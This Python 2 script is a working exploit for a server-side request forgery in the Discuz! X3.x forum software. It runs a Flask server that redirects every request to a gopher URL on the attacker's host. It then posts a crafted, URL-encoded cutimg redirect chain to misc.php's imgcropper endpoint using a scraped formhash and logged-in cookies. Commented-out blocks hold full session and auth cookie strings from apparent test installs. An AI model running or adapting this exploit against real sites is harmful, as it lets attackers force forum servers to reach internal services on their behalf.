from flask import Flask, Response, redirect, url_for
from werkzeug.routing import BaseConverter
import sys
import requests
import urlparse
import re

class Regex_url(BaseConverter):
    def __init__(self,url_map,*args):
        super(Regex_url,self).__init__(url_map)
        self.regex = args[0]

app = Flask(__name__)
app.url_map.converters['re'] = Regex_url

@app.route('/<re(".*?"):tmp>')
def test(tmp):
    return redirect('gopher://my_vps:52222/_hello_l3m0n')

def deal_cookie(cookies):
    ret_ = {}
    cookies = cookies.split(';')
    for cookie in cookies:
        cookie_k, cookie_v = cookie.split('=', 1)
        ret_[cookie_k.strip()] = cookie_v.strip()
    return ret_

def exploit(url, cookies, my_server):
    #print cookies
    url_path = urlparse.urlparse(url).path
    print '[*] url path: ', url_path

    try:
        r = requests.get(url + '/home.php?mod=spacecp&ac=pm', cookies = cookies, timeout = 5)
        formhash_pattern = 'name="formhash"\svalue="(.*)"\s\/>'
        m = re.search(formhash_pattern, r.content)
        if m is not None:
            formhash = m.group(1)
            print '[*] formhash: ', formhash
        else:
            print '[!] no formhash'
            exit()

        #formhash = 'b15c12d793'

        if sys.argv[2] == '4':
            redirect_url = '/www.baidu.com/../{url_path}/member.php%3fmod%3dlogging%26action%3dlogout%26referer%3dhttp%3a//a%2523%2540{my_server}%26quickforward%3d1'.format(url_path=url_path, my_server=my_server)
        else:
            # php ver 5.4 exploit
            redirect_url = '/www.baidu.com:80/../{url_path}/member.php%3fmod%3dlogging%26action%3dlogout%26referer%3dhttp%3a//a%2523%2540{my_server}%26quickforward%3d1'.format(url_path=url_path, my_server=my_server)
            
        print '[*] redirect url: ', redirect_url

        headers = {
            'Referer' : url,
            'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'
        }
        finall_url = '{url}/misc.php?mod=imgcropper&picflag=2&imgcroppersubmit=1&cutimg={redirect_url}&formhash={formhash}'.format(url=url, redirect_url=redirect_url, formhash=formhash)
        print finall_url
        r1 = requests.post(finall_url, cookies = cookies, headers = headers, timeout = 5)
        print '[*] Request Ok!'

        print r1.content

    except Exception as e:
        print e

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print 'Usage: python dz_ssrf_x3.4_exp.py method(server | exploit)'
        print 'Env: php version > 5.3 and vhost limit'
        exit()

    if sys.argv[1] == 'server':
        app.run(host='0.0.0.0',port=80)
    elif sys.argv[1] == 'exploit':
        
        ##### Need #####
        # url = 'http://lemon.i/code-src/dz/x3.4/DiscuzX/upload/'
        # cookies = 'my_wiki_testUserName=Lemon; rRUu_2132_saltkey=CWyvxWZ8; rRUu_2132_lastvisit=1541382566; rRUu_2132_nofavfid=1; 8LwF_2132_saltkey=szHmPRmf; 8LwF_2132_lastvisit=1541402970; 8LwF_2132_sid=IMZaU7; 8LwF_2132_lastact=1541406691%09member.php%09register; XpO2_2132_saltkey=s37U72UW; XpO2_2132_lastvisit=1541403820; XpO2_2132_ulastactivity=e7694pFJ%2FcjBGkN4F81%2B92OZpy0KM7jK%2BQiQEpdJdXX5pfsNRcmY; XpO2_2132_nofavfid=1; XpO2_2132_forum_lastvisit=D_2_1541407821; XpO2_2132_visitedfid=2; XpO2_2132_smile=1D1; XpO2_2132_sid=BEFLja; XpO2_2132_lastact=1541408679%09home.php%09spacecp; t6Ie_2132_saltkey=CIX1GEG5; t6Ie_2132_lastvisit=1541407111; t6Ie_2132_nofavfid=1; rRUu_2132_seccode=1.0c3c3410bd63f20ad3; rRUu_2132_ulastactivity=dd04IFpWP4pWFTOko44Iau4g73kaMlUhPOfNqE%2FqKXPiuGlW7nu9; rRUu_2132_auth=3bddYRzClHF%2FLPnn0Ol98dM431m0X7JrUpeyn%2FV1Kv%2B%2BTDvXJaP4z2oWIc6hAhR7UtUNS0um%2B%2Fmg0rNzsBP3; rRUu_2132_lastcheckfeed=3%7C1541415665; rRUu_2132_sid=H4N8vZ; rRUu_2132_lip=127.0.0.1%2C1541416949; rRUu_2132_lastact=1541417011%09misc.php%09patch; t6Ie_2132_seccode=3.cfb27d350f1d163d4a; t6Ie_2132_sid=i24Zf8; t6Ie_2132_ulastactivity=cf2aBkUn1e1fTaKhwl7NZkhYvsOk4hM452mSu%2FuY0R9XwnrqOHYP; t6Ie_2132_auth=7728fTf7S9VahSM2oi%2FGOoruqicxZeVI6p6qKqcgI2AxVAr92hGlP8aXLI7PKv4ykM5fuV33kU9Nf95K8HYe; t6Ie_2132_lastcheckfeed=2%7C1541469249; XDEBUG_SESSION=12321; t6Ie_2132_lastact=1541469369%09home.php%09spacecp; t6Ie_2132_noticeTitle=1'

        # url = 'http://lemon.i/code-src/dz/x3.2/'
        # cookies = 'my_wiki_testUserName=Lemon; rRUu_2132_saltkey=CWyvxWZ8; rRUu_2132_lastvisit=1541382566; rRUu_2132_nofavfid=1; 8LwF_2132_saltkey=szHmPRmf; 8LwF_2132_lastvisit=1541402970; 8LwF_2132_sid=IMZaU7; 8LwF_2132_lastact=1541406691%09member.php%09register; XpO2_2132_saltkey=s37U72UW; XpO2_2132_lastvisit=1541403820; XpO2_2132_nofavfid=1; XpO2_2132_forum_lastvisit=D_2_1541407821; XpO2_2132_visitedfid=2; XpO2_2132_smile=1D1; t6Ie_2132_saltkey=CIX1GEG5; t6Ie_2132_lastvisit=1541407111; t6Ie_2132_nofavfid=1; rRUu_2132_seccode=1.0c3c3410bd63f20ad3; rRUu_2132_ulastactivity=dd04IFpWP4pWFTOko44Iau4g73kaMlUhPOfNqE%2FqKXPiuGlW7nu9; rRUu_2132_auth=3bddYRzClHF%2FLPnn0Ol98dM431m0X7JrUpeyn%2FV1Kv%2B%2BTDvXJaP4z2oWIc6hAhR7UtUNS0um%2B%2Fmg0rNzsBP3; rRUu_2132_lastcheckfeed=3%7C1541415665; rRUu_2132_sid=H4N8vZ; rRUu_2132_lip=127.0.0.1%2C1541416949; rRUu_2132_lastact=1541417011%09misc.php%09patch; t6Ie_2132_seccode=3.cfb27d350f1d163d4a; t6Ie_2132_sid=i24Zf8; t6Ie_2132_ulastactivity=cf2aBkUn1e1fTaKhwl7NZkhYvsOk4hM452mSu%2FuY0R9XwnrqOHYP; t6Ie_2132_auth=7728fTf7S9VahSM2oi%2FGOoruqicxZeVI6p6qKqcgI2AxVAr92hGlP8aXLI7PKv4ykM5fuV33kU9Nf95K8HYe; t6Ie_2132_lastcheckfeed=2%7C1541469249; XDEBUG_SESSION=12321; t6Ie_2132_noticeTitle=1; t6Ie_2132_lastact=1541471050%09home.php%09spacecp; XpO2_2132_sid=XF36B9; XpO2_2132_sendmail=1; XpO2_2132_checkpatch=1; XpO2_2132_seccode=2.053e4e6d8340f04af5; XpO2_2132_ulastactivity=b0c7ETgbaFiYo%2FxAsda0%2BvEQEKniHt%2F5WI4yjJ2XF%2Fh6bxKowZSq; XpO2_2132_auth=4617rVFoofBOMoho4xTlfNMr72JZ0YkL%2B1yCAnc0WG0okaKdl%2FOoAmhdK2sA1uTesDCgVFlrzIMwH09hjh2N; XpO2_2132_creditnotice=0D0D2D0D0D0D0D0D0D5; XpO2_2132_creditbase=0D0D0D0D0D0D0D0D0; XpO2_2132_creditrule=%E6%AF%8F%E5%A4%A9%E7%99%BB%E5%BD%95; XpO2_2132_onlineusernum=1; XpO2_2132_lastact=1541471472%09home.php%09spacecp; XpO2_2132_checkpm=1; XpO2_2132_noticeTitle=1'

        # url = 'http://lemon.i/code-src/dz/Discuz_TC_BIG5/upload/'
        # cookies = 'my_wiki_testUserName=Lemon; rRUu_2132_saltkey=CWyvxWZ8; rRUu_2132_lastvisit=1541382566; rRUu_2132_nofavfid=1; 8LwF_2132_saltkey=szHmPRmf; 8LwF_2132_lastvisit=1541402970; 8LwF_2132_sid=IMZaU7; 8LwF_2132_lastact=1541406691%09member.php%09register; XpO2_2132_saltkey=s37U72UW; XpO2_2132_lastvisit=1541403820; XpO2_2132_nofavfid=1; XpO2_2132_forum_lastvisit=D_2_1541407821; XpO2_2132_visitedfid=2; XpO2_2132_smile=1D1; t6Ie_2132_saltkey=CIX1GEG5; t6Ie_2132_lastvisit=1541407111; t6Ie_2132_nofavfid=1; rRUu_2132_seccode=1.0c3c3410bd63f20ad3; rRUu_2132_ulastactivity=dd04IFpWP4pWFTOko44Iau4g73kaMlUhPOfNqE%2FqKXPiuGlW7nu9; rRUu_2132_auth=3bddYRzClHF%2FLPnn0Ol98dM431m0X7JrUpeyn%2FV1Kv%2B%2BTDvXJaP4z2oWIc6hAhR7UtUNS0um%2B%2Fmg0rNzsBP3; rRUu_2132_lastcheckfeed=3%7C1541415665; rRUu_2132_sid=H4N8vZ; rRUu_2132_lip=127.0.0.1%2C1541416949; rRUu_2132_lastact=1541417011%09misc.php%09patch; t6Ie_2132_seccode=3.cfb27d350f1d163d4a; t6Ie_2132_sid=i24Zf8; t6Ie_2132_ulastactivity=cf2aBkUn1e1fTaKhwl7NZkhYvsOk4hM452mSu%2FuY0R9XwnrqOHYP; t6Ie_2132_auth=7728fTf7S9VahSM2oi%2FGOoruqicxZeVI6p6qKqcgI2AxVAr92hGlP8aXLI7PKv4ykM5fuV33kU9Nf95K8HYe; t6Ie_2132_lastcheckfeed=2%7C1541469249; XDEBUG_SESSION=12321; t6Ie_2132_noticeTitle=1; t6Ie_2132_lastact=1541471050%09home.php%09spacecp; XpO2_2132_sid=XF36B9; XpO2_2132_sendmail=1; XpO2_2132_seccode=2.053e4e6d8340f04af5; XpO2_2132_ulastactivity=b0c7ETgbaFiYo%2FxAsda0%2BvEQEKniHt%2F5WI4yjJ2XF%2Fh6bxKowZSq; XpO2_2132_auth=4617rVFoofBOMoho4xTlfNMr72JZ0YkL%2B1yCAnc0WG0okaKdl%2FOoAmhdK2sA1uTesDCgVFlrzIMwH09hjh2N; XpO2_2132_onlineusernum=1; XpO2_2132_noticeTitle=1; XpO2_2132_lastact=1541471476%09forum.php%09'

        my_server = 'my_vps'
        ################

        exploit(url, deal_cookie(cookies), my_server)
